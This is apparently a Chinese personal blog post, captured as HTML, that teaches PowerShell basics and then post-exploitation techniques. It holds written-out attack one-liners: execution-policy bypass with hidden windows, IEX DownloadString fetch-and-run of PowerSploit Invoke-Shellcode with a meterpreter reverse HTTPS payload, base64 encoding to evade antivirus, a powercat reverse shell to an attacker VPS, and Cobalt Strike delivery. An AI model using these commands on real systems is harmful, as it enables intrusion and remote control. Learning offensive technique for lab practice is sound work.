@@ -1,0 +1,776 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="miFuzz">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="POWERSHELL基础特点 可以远程执行  PowerShell可以用来管理活动目录  Windows7以上的操作系统默认安装  很多杀毒软件检测不到PowerShell的活动  可以从另外一个系统中下载PowerShell脚本并执行  cmd通常会被杀毒软件阻止运行，而PowerShell不会  PowerShell可以在内存中运行，不需要写入磁盘。   版本1.在powershell,运行命">
+<meta property="og:type" content="article">
+<meta property="og:title" content="powershell">
+<meta property="og:url" content="https://blog.dbii.top/posts/2c58b17a/index.html">
+<meta property="og:site_name" content="miFuzz&#39;s blog">
+<meta property="og:description" content="POWERSHELL基础特点 可以远程执行  PowerShell可以用来管理活动目录  Windows7以上的操作系统默认安装  很多杀毒软件检测不到PowerShell的活动  可以从另外一个系统中下载PowerShell脚本并执行  cmd通常会被杀毒软件阻止运行，而PowerShell不会  PowerShell可以在内存中运行，不需要写入磁盘。   版本1.在powershell,运行命">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321221339364.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/honexz/typora_image/image-20240321230537369.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321234348644.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321234529100.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321235659304.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240322101839642.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240322101959748.png">
+<meta property="article:published_time" content="2024-03-27T14:42:44.000Z">
+<meta property="article:modified_time" content="2024-03-27T14:43:10.746Z">
+<meta property="article:author" content="miFuzz">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321221339364.png">
+  
+  
+  
+  <title>powershell - miFuzz&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/gdt.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.dbii.top","root":"/","version":"1.9.4","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"Markdown"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>迷糊</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/music/">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/read/">
+                <i class="iconfont icon-books"></i>
+                <span>阅读</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/flowerandbook.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">powershell</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-27 22:42" pubdate>
+          2024年3月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          51 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">powershell</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="POWERSHELL"><a href="#POWERSHELL" class="headerlink" title="POWERSHELL"></a>POWERSHELL</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
+<li><p>可以远程执行</p>
+</li>
+<li><p>PowerShell可以用来管理活动目录</p>
+</li>
+<li><p>Windows7以上的操作系统默认安装</p>
+</li>
+<li><p>很多杀毒软件检测不到PowerShell的活动</p>
+</li>
+<li><p>可以从另外一个系统中下载PowerShell脚本并执行</p>
+</li>
+<li><p>cmd通常会被杀毒软件阻止运行，而PowerShell不会</p>
+</li>
+<li><p>PowerShell可以在内存中运行，不需要写入磁盘。</p>
+</li>
+</ul>
+<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>1.在powershell,运行命令<code>GET-HOST</code></p>
+<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Name</span>             : ConsoleHost<br><span class="hljs-attribute">Version</span>          : <span class="hljs-number">5</span>.<span class="hljs-number">1</span>.<span class="hljs-number">19041</span>.<span class="hljs-number">3031</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>2.powershell,运行命令<code>$PSVERSIONTABLE.PSVERSION</code></p>
+<figure class="highlight brainfuck"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">Major  Minor  Build  Revision</span><br><span class="hljs-literal">-----</span>  <span class="hljs-literal">-----</span>  <span class="hljs-literal">-----</span>  <span class="hljs-literal">--------</span><br><span class="hljs-comment">5      1      19041  3031</span><br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="脚本文件"><a href="#脚本文件" class="headerlink" title="脚本文件"></a>脚本文件</h3><p>通常，PowerShell 脚本文件使用 <code>.ps1</code> 后缀作为文件扩展名。后缀的最后一个字符是数字1，而不是字母l,<code>script.ps1</code> 就是一个 PowerShell 脚本文件。</p>
+<p>PowerShell 的脚本文件是常见的文本文件，其每个命令都是独立的一行。</p>
+<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>使用以下命令查询执行策略</p>
+<figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ExecutionPolicy</span><br></code></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li>Restricted - 脚本不能运行。</li>
+<li>RemoteSigned - 本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）。</li>
+<li>AllSigned – 仅当脚本由受信任的发布者签名才能运行。</li>
+<li>Unrestricted – 脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</li>
+</ol>
+<p>你可以使用下面的cmdlet命令设置PowerShell的执行策略：</p>
+<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Set</span>-ExecutionPolicy &lt;<span class="hljs-keyword">policy</span> <span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>1.完整路径</p>
+<p>如果脚本文件位于不在 PowerShell 的执行路径中的目录中，可以使用完整的文件路径来运行脚本。例如：</p>
+<figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">C:\Scripts\<span class="hljs-keyword">script</span>.ps1<br></code></pre></td></tr></tbody></table></figure>
+
+<p>2.位于执行路径中的目录</p>
+<p>在 PowerShell 终端中，使用 <code>cd</code> 命令导航到存储脚本的目录，输入以下命令并按回车键来运行脚本：</p>
+<figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">.\<span class="hljs-keyword">script</span>.ps1<br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="管道"><a href="#管道" class="headerlink" title="管道(|)"></a>管道(|)</h3><p>管道：将一个命令的输出作为另一个命令的输入，两个命令间使用管道符连接。</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-Process</span> | <span class="hljs-built_in">Where-Object</span> { <span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-eq</span> <span class="hljs-string">"nmap.exe"</span> } | <span class="hljs-built_in">Stop-Process</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>这个命令的执行过程如下：</p>
+<ol>
+<li><code>Get-Process</code>：获取所有正在运行的进程。</li>
+<li><code>Where-Object { $_.Name -eq "nmap.exe" }</code>：通过筛选器 <code>Where-Object</code>，选择进程名为 “nmap.exe” 的进程。</li>
+<li><code>Stop-Process</code>：将选定的进程传递给 <code>Stop-Process</code> 命令，停止它们的执行。</li>
+</ol>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在 PowerShell 中，命令通常被称为 “cmdlet”（命令-LET）。”cmdlet” 是由 “命令”（Command）和 “Let”（简称 for “Lightweight Extensibility Technology”）两个词组合而成的。</p>
+<p>PowerShell 的 cmdlet 是一种特殊类型的命令，它们是用 PowerShell 编写的可执行程序。这些 cmdlet 用于执行各种操作，如管理文件和文件夹、操作注册表、管理进程、配置系统设置等。</p>
+<p>每个 cmdlet 都有一个唯一的名称，遵循一定的命名规则。通常，cmdlet 的名称由一个动词和一个或多个名词组成，中间使用连字符（-）分隔。例如，<code>Get-Process</code>、<code>Set-Variable</code>、<code>Remove-Item</code> 等都是常见的 cmdlet 名称。</p>
+<p><strong>动词</strong>通常表示<strong>操作的类型</strong>，如获取（Get）、设置（Set）、删除（Remove）、新建（New）。<strong>名词</strong>则表示操作的<strong>目标或对象</strong>，如进程（Process）、变量（Variable）、项目（Item）。</p>
+<p>除了 cmdlet，PowerShell 还支持函数（Function）和脚本（Script）等命令类型，它们也可以根据命名规则进行命名。</p>
+<p>命令的别名一般也<strong>兼容</strong>Windows Command 和Linux shell,powershell的命令<strong>不区分大小写</strong>。</p>
+<h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在powershell里输入help即可获取帮助。</p>
+<p>以下是一些常用的 PowerShell 命令及其功能的简要介绍：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-Process</span>：获取正在运行的进程的信息。<br><span class="hljs-built_in">Get-Service</span>：获取系统中安装的服务的信息。<br><span class="hljs-built_in">Get-ChildItem</span>（或 <span class="hljs-built_in">ls</span>）：列出当前目录下的文件和文件夹。<br><span class="hljs-built_in">Set-Location</span>（或 <span class="hljs-built_in">cd</span>）：更改当前工作目录。<br><span class="hljs-built_in">New-Item</span>：创建新的文件、文件夹或注册表项。<br><span class="hljs-built_in">Copy-Item</span>：复制文件或文件夹。<br><span class="hljs-built_in">Move-Item</span>：移动文件或文件夹。<br><span class="hljs-built_in">Remove-Item</span>（或 <span class="hljs-built_in">rm</span>）：删除文件或文件夹。<br><span class="hljs-built_in">Rename-Item</span>（或 <span class="hljs-built_in">ren</span>）：重命名文件或文件夹。<br><span class="hljs-built_in">Get-Content</span>（或 <span class="hljs-built_in">gc</span>）：读取文件的内容。<br><span class="hljs-built_in">Set-Content</span>（或 <span class="hljs-built_in">sc</span>）：将文本内容写入文件。<br><span class="hljs-built_in">Invoke-WebRequest</span>：发送 HTTP 请求并获取响应。<br><span class="hljs-built_in">Test-Connection</span>（或 ping）：测试与指定主机的网络连接。<br><span class="hljs-built_in">Get-Help</span>（或 help）：获取 PowerShell 命令的帮助文档。<br><span class="hljs-built_in">Get-Command</span>（或 <span class="hljs-built_in">gcm</span>）：获取可用的 PowerShell 命令列表。<br><span class="hljs-built_in">Get-Variable</span>：获取当前会话中定义的变量列表。<br><span class="hljs-built_in">Set-Variable</span>：设置或修改变量的值。<br><span class="hljs-built_in">Start-Process</span>：启动新的进程。<br><span class="hljs-built_in">Select-Object</span>（或 <span class="hljs-built_in">select</span>）：选择对象的特定属性。<br><span class="hljs-built_in">Where-Object</span>（或 <span class="hljs-built_in">where</span>）：根据指定的条件筛选对象<br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="绕权执行脚本"><a href="#绕权执行脚本" class="headerlink" title="绕权执行脚本"></a>绕权执行脚本</h3><p><strong>常用参数说明</strong>：</p>
+<ul>
+<li>-ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略。这个参数非常重要。在默认情况下，PowerShell的安全策略规定PowerShell不能运行命令和文件。</li>
+<li>-WindowStyle Hidden （-W Hidden）：隐藏窗口。</li>
+<li>-NonInteractive（-NonI）：非交互模式。PowerShell不为用户提供交互式的提示。</li>
+<li>-NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</li>
+<li>—noexit：执行后不退出Shell。这个参数在使用键盘记录等脚本时非常重要。</li>
+<li>-NoLogo：启动不显示版权标志的PowerShell。</li>
+</ul>
+<h4 id="绕过本地权限执行脚本"><a href="#绕过本地权限执行脚本" class="headerlink" title="绕过本地权限执行脚本"></a>绕过本地权限执行脚本</h4><p>一般我们的脚本执行策略是<strong>Restricted - 脚本不能运行</strong>。并且修改执行策略需要管理员权限。可以使用下列命令绕过本地权限执行脚本：</p>
+<figure class="highlight nsis"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">powershell.exe -<span class="hljs-keyword">exec</span> bypass -<span class="hljs-keyword">file</span> mf.ps1<br>powerShell.exe -ExecutionPolicy Bypass -<span class="hljs-keyword">File</span> mf.ps1<br></code></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>powershell.exe</code>：这是运行 PowerShell 的可执行文件。</li>
+<li><code>-exec bypass</code>：这是 PowerShell 的执行策略参数，<code>bypass</code> 表示绕过执行策略。默认情况下，PowerShell 执行策略可能会限制脚本的执行。通过指定 <code>bypass</code>，可以绕过这些限制。</li>
+<li><code>-file mf.ps1</code>：这是指定要执行的脚本文件的参数。在这个例子中，<code>mf.ps1</code> 是脚本的文件名。使用 <code>-file</code> 参数可以告诉 PowerShell 执行指定的脚本文件。</li>
+</ul>
+<p>综上所述，<code>powershell.exe -exec bypass -file mf.ps1</code> 命令用于以绕过执行策略的方式执行名为 <code>mf.ps1</code> 的 PowerShell 脚本。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">"&amp; {Import-Module .\mf.ps1}"</span><br></code></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>powershell.exe</code>：这是运行 PowerShell 的可执行文件。</li>
+<li><code>-exec bypass</code>：这是 PowerShell 的执行策略参数，<code>bypass</code> 表示绕过执行策略。默认情况下，PowerShell 执行策略可能会限制脚本的执行。通过指定 <code>bypass</code>，可以绕过这些限制。</li>
+<li><code>-Command</code>：这是指定要在 PowerShell 中执行的命令的参数。</li>
+<li><code>"&amp; {Import-Module .\test.ps1}"</code>：这是要执行的命令。在这个例子中，命令是一个脚本块 <code>&amp; {Import-Module .\test.ps1}</code>，其中使用 <code>Import-Module</code> 命令导入名为 <code>test.ps1</code> 的 PowerShell 模块。<code>.\test.ps1</code> 表示相对路径下的 <code>mf.ps1</code> 文件。</li>
+</ul>
+<p>我们编写输出<strong>hello powershell</strong>的脚本来测试</p>
+<figure class="highlight cos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">Write</span>-Host <span class="hljs-string">"Hello, PowerShell"</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321221339364.png" srcset="/img/loading.gif" lazyload alt="image-20240321221339364"></p>
+<h4 id="远程绕过本地权限执行"><a href="#远程绕过本地权限执行" class="headerlink" title="远程绕过本地权限执行"></a>远程绕过本地权限执行</h4><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Windowstyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-NoProfile</span> <span class="hljs-literal">-NonI</span> <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">'https:URL/target.ps1'</span>);[<span class="hljs-type">parameters</span>]<br><br>powerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Windowstyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-NoProfile</span> <span class="hljs-literal">-NonI</span> <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">'https://github.com/PowerShellMafia/PowerSploit/tree/master/CodeExecution/Invoke-Shellcode.ps1'</span>) ; <span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-Payload</span> windows/meterpreter/reverse_https <span class="hljs-literal">-Lhost</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-Lport</span> <span class="hljs-number">8082</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>Invoke-Shellcode函数将使用”windows/meterpreter/reverse_https”作为payload，将建立一个反向HTTPS连接，并将会话发送到指定IP地址（Lhost）和端口（Lport）上。在这个例子中，IP地址为127.0.0.1，端口为8082。</p>
+<p>IEX是PowerShell中的一种简写形式，表示Invoke-Expression。它用于执行包含在字符串中的命令或脚本代码。在这种情况下，命令是<code>(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/tree/master/CodeExecution/Invoke-Shellcode.ps1')</code>。</p>
+<p><code>(New-Object Net.WebClient)</code>创建了一个名为<code>WebClient</code>的.NET类实例，它提供了与Web服务器进行交互的功能。然后，使用<code>.</code>运算符调用<code>DownloadString</code>方法，该方法接受一个URL作为参数，并从指定的URL下载字符串内容。</p>
+<p><strong>测试</strong></p>
+<p>我们在本地搭建一个web网站来存放脚本文件,测试远程绕过本地权限执行脚本。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/honexz/typora_image/image-20240321230537369.png" srcset="/img/loading.gif" lazyload alt="image-20240321230537369"></p>
+<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.Webclient).DownloadString(<span class="hljs-string">'http://127.0.0.1/testps1/mf.ps1'</span>)<br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321234348644.png" srcset="/img/loading.gif" lazyload alt="image-20240321234348644"></p>
+<p>执行完脚本后，磁盘上并没有存储 mf.ps1 脚本。</p>
+<h3 id="使用base64编码"><a href="#使用base64编码" class="headerlink" title="使用base64编码"></a>使用base64编码</h3><p>使用base64将powershell 命令进行编码，可以混淆和压缩代码，降低脚本被安全软件查杀的可能性。</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$COMMAND</span> = <span class="hljs-string">"ls"</span>    <br><span class="hljs-variable">$ENCODED</span> = <span class="hljs-selector-attr">[Convert]</span>::<span class="hljs-built_in">ToBase64String</span>(<span class="hljs-selector-attr">[Text.Encoding]</span>::Unicode<span class="hljs-selector-class">.GetBytes</span>(<span class="hljs-variable">$COMMAND</span>))<br>Write-Output <span class="hljs-variable">$ENCODED</span><br><br>powershell<span class="hljs-selector-class">.exe</span> -ExecutionPolicy Bypass -File test.ps1<br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321234529100.png" srcset="/img/loading.gif" lazyload alt="image-20240321234529100"></p>
+<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell (<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> <span class="hljs-keyword">system</span>.net.webclient).downloadfile(<span class="hljs-string">'http://URL:端口/target.exe'</span>,<span class="hljs-string">'F:/target.exe'</span>);<br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>利用powershell的powercat反弹shell</p>
+<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#在cmd窗口执行<br>powershell IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.Webclient).DownloadString(<span class="hljs-string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>);powercat -c vps的ip -p <span class="hljs-number">8888</span> -e cmd<br><br>#在powershell窗口执行<br>IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.Net.Webclient).DownloadString(<span class="hljs-string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>);powercat -c vps的ip -p <span class="hljs-number">8888</span> -e cmd<br></code></pre></td></tr></tbody></table></figure>
+
+<p>例如：</p>
+<p>在本地监听8082端口</p>
+<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc64</span>.exe -lvp <span class="hljs-number">8082</span><br><span class="hljs-attribute">powercat</span> -l -p <span class="hljs-number">8082</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>靶机执行：</p>
+<figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">IEX</span> (New-Object System.Net.Webclient).DownloadString(<span class="hljs-string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>);<span class="hljs-attribute">powercat</span> -c <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">8082</span> -e cmd<br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240321235659304.png" srcset="/img/loading.gif" lazyload alt="image-20240321235659304"></p>
+<h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p>CS Attack -&gt; Web Drive-by -&gt; Scripted Web Delivery</p>
+<p><img src="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240322101839642.png" srcset="/img/loading.gif" lazyload alt="image-20240322101839642"></p>
